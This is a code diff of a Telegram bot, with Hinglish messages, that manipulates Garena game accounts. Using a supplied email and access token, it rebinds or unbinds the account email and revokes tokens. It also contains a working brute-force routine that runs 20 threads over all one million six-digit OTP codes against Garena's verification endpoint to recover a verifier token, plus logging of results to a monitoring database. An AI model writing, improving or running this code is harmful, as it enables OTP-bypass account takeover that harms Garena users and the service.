-        f"⏳ OTP `{new_email}` pe bhej raha hoon...", parse_mode="Markdown"
+        f"⏳ OTP `{ud['new_email']}` pe bhej raha hoon...", parse_mode="Markdown"
     )
     try:
-        res = api_send_otp(new_email, access)
+        res = api_send_otp(ud["new_email"], ud["access"])
         if res.get("result") == 0:
-            await update.effective_message.reply_text(
-                "✅ OTP bhej diya!\n\n📝 Nayi email ka OTP enter karo:"
-            )
+            await update.effective_message.reply_text("✅ OTP bhej diya!\n\n📝 Nayi email ka OTP enter karo:")
             return CHANGE_NEW_OTP
         else:
-            await _err(update, f"OTP send fail:\n`{res}`")
+            await _err(update, context, f"OTP send fail:\n`{res}`")
             return ConversationHandler.END
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
+        await _err(update, context, f"Error: `{e}`")
         return ConversationHandler.END
 
 
 async def change_get_old_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    otp       = update.message.text.strip()
-    ud        = context.user_data
-    old_email = ud["email"]
-    access    = ud["access"]
-
+    otp, ud = update.message.text.strip(), context.user_data
     await update.message.reply_text("⏳ Identity verify kar raha hoon...")
     try:
-        res = api_verify_identity_otp(old_email, access, otp)
-        identity_token = res.get("identity_token")
-        if not identity_token:
-            await _err(update, f"Verify fail:\n`{res}`")
-            return ConversationHandler.END
-        ud["identity_token"] = identity_token
-        return await _finish_rebind(update, context)
+        res = api_verify_identity_otp(ud["email"], ud["access"], otp)
+        it = res.get("identity_token")
+        if not it:
+            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
+        ud["identity_token"] = it
+        return await _send_new_email_otp(update, context)
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
-        return ConversationHandler.END
+        await _err(update, context, f"Error: `{e}`"); return ConversationHandler.END
 
 
 async def change_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    password  = update.message.text.strip()
-    ud        = context.user_data
-    old_email = ud["email"]
-    access    = ud["access"]
-
+    pw, ud = update.message.text.strip(), context.user_data
     await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
     try:
-        res = api_verify_identity_password(old_email, access, password)
-        identity_token = res.get("identity_token")
-        if not identity_token:
-            await _err(update, f"Verify fail:\n`{res}`")
-            return ConversationHandler.END
-        ud["identity_token"] = identity_token
-        return await _finish_rebind(update, context)
+        res = api_verify_identity_password(ud["email"], ud["access"], pw)
+        it = res.get("identity_token")
+        if not it:
+            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
+        ud["identity_token"] = it
+        return await _send_new_email_otp(update, context)
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
-        return ConversationHandler.END
+        await _err(update, context, f"Error: `{e}`"); return ConversationHandler.END
 
 
 async def change_get_new_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    otp       = update.message.text.strip()
-    ud        = context.user_data
-    new_email = ud["new_email"]
-    access    = ud["access"]
-    identity_token = ud["identity_token"]
-
+    otp, ud = update.message.text.strip(), context.user_data
     await update.message.reply_text("⏳ Nayi email verify kar raha hoon...")
     try:
-        res = api_verify_otp(new_email, access, otp)
-        verifier_token = res.get("verifier_token")
-        if not verifier_token:
-            await _err(update, f"Verify fail:\n`{res}`")
-            return ConversationHandler.END
+        res = api_verify_otp(ud["new_email"], ud["access"], otp)
+        vt = res.get("verifier_token")
+        if not vt:
+            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
         await update.message.reply_text("⏳ Rebind request create kar raha hoon...")
-        rebind_res = api_create_rebind_request(
-            access, identity_token, verifier_token, new_email
-        )
-        if rebind_res.get("result") == 0:
-            await _done(update, f"✅ *SUCCESS!* Email `{new_email}` pe change ho gaya!")
+        r2 = api_create_rebind_request(ud["access"], ud["identity_token"], vt, ud["new_email"])
+        if r2.get("result") == 0:
+            await _done(update, context, f"✅ *SUCCESS!* Email `{ud['new_email']}` pe change ho gaya!")
         else:
-            await _err(update, f"Rebind fail:\n`{rebind_res}`")
+            await _err(update, context, f"Rebind fail:\n`{r2}`")
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
+        await _err(update, context, f"Error: `{e}`")
     return ConversationHandler.END
 
 # ─── Brute Force (Background) ─────────────────────────────────────────────────
 
-async def run_brute_force(chat_id: int, email: str, access: str, bot) -> None:
-    """
-    20 parallel threads, 000000–999999.
-    Sends EXACTLY ONE Telegram message when found. All threads stop immediately.
-    """
+async def run_brute_force(
+    chat_id: int, email: str, access: str, bot, log_id: int | None
+) -> None:
     found_event   = threading.Event()
     result_holder: list[dict] = []
 
@@ -933,29 +836,25 @@ async def run_brute_force(chat_id: int, email: str, access: str, bot) -> None:
             if found_event.is_set():
                 return
             code_str = f"{code:06d}"
-            data = {"email": email, "app_id": GARENA_APP_ID,
-                    "access_token": access, "otp": code_str}
             try:
-                resp   = requests.post(url, headers=GARENA_HEADERS, data=data, timeout=15)
+                resp   = requests.post(url, headers=GARENA_HEADERS,
+                                       data={"email": email, "app_id": GARENA_APP_ID,
+                                             "access_token": access, "otp": code_str},
+                                       timeout=15)
                 result = resp.json()
                 if result.get("result") == 0:
                     found_event.set()
-                    result_holder.append({
-                        "code": code_str,
-                        "verifier_token": result.get("verifier_token", ""),
-                    })
+                    result_holder.append({"code": code_str,
+                                          "verifier_token": result.get("verifier_token", "")})
                     return
             except Exception:
                 if found_event.is_set():
                     return
-                continue
 
-    NUM_THREADS = 20
-    TOTAL       = 1_000_000
-    chunk       = TOTAL // NUM_THREADS
+    NUM_THREADS, TOTAL = 20, 1_000_000
+    chunk = TOTAL // NUM_THREADS
 
     loop = asyncio.get_event_loop()
-
     def run_pool() -> None:
         with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
             futures = [
@@ -969,6 +868,8 @@ async def run_brute_force(chat_id: int, email: str, access: str, bot) -> None:
 
     if result_holder:
         r = result_holder[0]
+        if log_id:
+            db.update_result(log_id, "success")
         await bot.send_message(
             chat_id=chat_id,
             text=(
@@ -977,62 +878,101 @@ async def run_brute_force(chat_id: int, email: str, access: str, bot) -> None:
                 f"🔑 OTP Code: `{r['code']}`\n"
                 f"🎫 Verifier Token: `{r['verifier_token']}`"
             ),
-            parse_mode="Markdown",
-            reply_markup=back_kb(),
+            parse_mode="Markdown", reply_markup=back_kb()
         )
     else:
+        if log_id:
+            db.update_result(log_id, "failed")
         await bot.send_message(
             chat_id=chat_id,
-            text=(
-                "❌ Brute force complete — sahi code nahi mila.\n"
-                "(000000–999999 sab try ho gaye)"
-            ),
-            reply_markup=back_kb(),
+            text="❌ Brute force complete — sahi code nahi mila.\n(000000–999999 sab try ho gaye)",
+            reply_markup=back_kb()
         )
 
 # ─── Utility Commands ─────────────────────────────────────────────────────────
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    mk = monitoring.MONITORING_KEY
+    monitor_hint = (
+        f"\n\n📊 *Monitoring Dashboard:*\n"
+        f"`/monitor?key=YOUR_KEY` (set in Render env)"
+    ) if mk else ""
     await update.message.reply_text(
         "📋 *Commands:*\n"
         "/start — Main menu\n"
         "/cancel — Operation cancel karo\n"
         "/clear — Saved credentials delete karo\n"
-        "/ping — Bot status\n\n"
-        "💡 *Tip:* Ek baar email/token enter karo —\n"
-        "bot yaad rakhega aur automatically suggest karega!",
-        parse_mode="Markdown",
-        reply_markup=back_kb(),
+        "/ping — Bot status" + monitor_hint,
+        parse_mode="Markdown", reply_markup=back_kb()
     )
 
 
 async def clear_creds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     context.user_data.pop("saved_email", None)
     context.user_data.pop("saved_access", None)
-    await update.message.reply_text(
-        "🗑️ Saved credentials delete ho gayi.\n\n/start — Main menu",
-        reply_markup=back_kb(),
-    )
+    await update.message.reply_text("🗑️ Saved credentials delete ho gayi.", reply_markup=back_kb())
 
 
 async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("🟢 Bot online hai!", reply_markup=back_kb())
 
-# ─── App Entry Point ──────────────────────────────────────────────────────────
+# ─── Main ─────────────────────────────────────────────────────────────────────
+
+async def run_webhook_server(app: Application, base_url: str, webhook_secret: str, port: int) -> None:
+    from aiohttp import web
+    server_app = web.Application()
+
+    async def telegram_webhook(request: web.Request) -> web.Response:
+        try:
+            data = await request.json()
+            await app.update_queue.put(Update.de_json(data=data, bot=app.bot))
+            return web.Response(text="OK")
+        except Exception as e:
+            return web.Response(status=400, text=str(e))
+
+    server_app.router.add_post(f"/{webhook_secret}", telegram_webhook)
+    server_app.router.add_get("/", monitoring._root)
+    server_app.router.add_get("/monitor", monitoring._dashboard)
+    server_app.router.add_get("/api/data", monitoring._api_data)
+    server_app.router.add_post("/api/flag/{id}", monitoring._api_flag)
+
+    webhook_url = f"{base_url.rstrip('/')}/{webhook_secret}"
+
+    async with app:
+        await app.start()
+        await app.bot.set_webhook(url=webhook_url, secret_token=webhook_secret)
+        runner = web.AppRunner(server_app)
+        await runner.setup()
+        site = web.TCPSite(runner, "0.0.0.0", port)
+        await site.start()
+        print(f"[Bot] Webhook listening on port {port}")
+        print(f"[Monitor] Dashboard: {base_url}/monitor?key={monitoring.MONITORING_KEY}")
+        stop_event = asyncio.Event()
+        try:
+            await stop_event.wait()
+        except (KeyboardInterrupt, SystemExit, asyncio.CancelledError):
+            pass
+        finally:
+            await site.stop()
+            await runner.cleanup()
+            await app.stop()
+
 
 def main() -> None:
     token = os.environ.get("TELEGRAM_BOT_TOKEN")
     if not token:
         raise RuntimeError("TELEGRAM_BOT_TOKEN is not set.")
 
-    # PicklePersistence: user credentials survive bot restarts
+    # Initialize monitoring database
+    db.init_db()
+
     persistence = PicklePersistence(filepath="garena_bot_data.pkl")
     app = Application.builder().token(token).persistence(persistence).build()
 
     TEXT = filters.TEXT & ~filters.COMMAND
 
     entry_points = [
-        CommandHandler("start", show_main_menu),
+        CommandHandler("start",  show_main_menu),
         CallbackQueryHandler(show_main_menu,    pattern="^back_main$"),
         CallbackQueryHandler(clear_creds,       pattern="^clear_creds$"),
         CallbackQueryHandler(add_email_start,   pattern="^add_email$"),
@@ -1059,22 +999,17 @@ def main() -> None:
                 CallbackQueryHandler(revoke_start,       pattern="^revoke_token$"),
                 CallbackQueryHandler(bf_start,           pattern="^brute_force$"),
             ],
-            # ── Credential flow: email + token ───────────────────────────────
-            CREDS_CONFIRM:   [CallbackQueryHandler(creds_confirm)],
-            CREDS_NEW_EMAIL: [MessageHandler(TEXT, creds_new_email)],
-            CREDS_NEW_ACCESS:[MessageHandler(TEXT, creds_new_access)],
-            CREDS_SAVE_ASK:  [CallbackQueryHandler(creds_save_ask)],
-            # ── Credential flow: token only ──────────────────────────────────
+            CREDS_CONFIRM:        [CallbackQueryHandler(creds_confirm)],
+            CREDS_NEW_EMAIL:      [MessageHandler(TEXT, creds_new_email)],
+            CREDS_NEW_ACCESS:     [MessageHandler(TEXT, creds_new_access)],
+            CREDS_SAVE_ASK:       [CallbackQueryHandler(creds_save_ask)],
             CREDS_TOKEN_CONFIRM:  [CallbackQueryHandler(creds_token_confirm)],
             CREDS_TOKEN_NEW:      [MessageHandler(TEXT, creds_token_new)],
             CREDS_TOKEN_SAVE_ASK: [CallbackQueryHandler(creds_token_save_ask)],
-            # ── Add Email ────────────────────────────────────────────────────
-            ADD_OTP: [MessageHandler(TEXT, add_get_otp)],
-            # ── Unbind Email ─────────────────────────────────────────────────
-            UNBIND_METHOD: [CallbackQueryHandler(unbind_method)],
-            UNBIND_OTP:    [MessageHandler(TEXT, unbind_get_otp)],
-            UNBIND_PASS:   [MessageHandler(TEXT, unbind_get_pass)],
-            # ── Change Bind Email ─────────────────────────────────────────────
+            ADD_OTP:          [MessageHandler(TEXT, add_get_otp)],
+            UNBIND_METHOD:    [CallbackQueryHandler(unbind_method)],
+            UNBIND_OTP:       [MessageHandler(TEXT, unbind_get_otp)],
+            UNBIND_PASS:      [MessageHandler(TEXT, unbind_get_pass)],
             CHANGE_NEW_EMAIL: [MessageHandler(TEXT, change_get_new_email)],
             CHANGE_METHOD:    [CallbackQueryHandler(change_method)],
             CHANGE_OLD_OTP:   [MessageHandler(TEXT, change_get_old_otp)],
@@ -1084,7 +1019,6 @@ def main() -> None:
         fallbacks=[
             CommandHandler("cancel", cancel_op),
             CommandHandler("start",  show_main_menu),
-            CommandHandler("clear",  clear_creds_cmd),
         ],
         allow_reentry=True,
         persistent=True,
@@ -1100,17 +1034,11 @@ def main() -> None:
     webhook_secret= os.environ.get("WEBHOOK_SECRET")
 
     if base_url and webhook_secret:
-        port        = int(os.environ.get("PORT", "8000"))
-        webhook_url = f"{base_url.rstrip('/')}/{webhook_secret}"
-        print("Bot webhook mode mein chal raha hai.")
-        app.run_webhook(
-            listen="0.0.0.0",
-            port=port,
-            url_path=webhook_secret,
-            webhook_url=webhook_url,
-        )
+        port = int(os.environ.get("PORT", "8000"))
+        asyncio.run(run_webhook_server(app, base_url, webhook_secret, port))
     else:
-        print("Bot polling mode mein chal raha hai (local).")
+        print("[Bot] Polling mode (local)")
+        monitoring.start_polling_monitor(port=8081)
         app.run_polling()
 
 
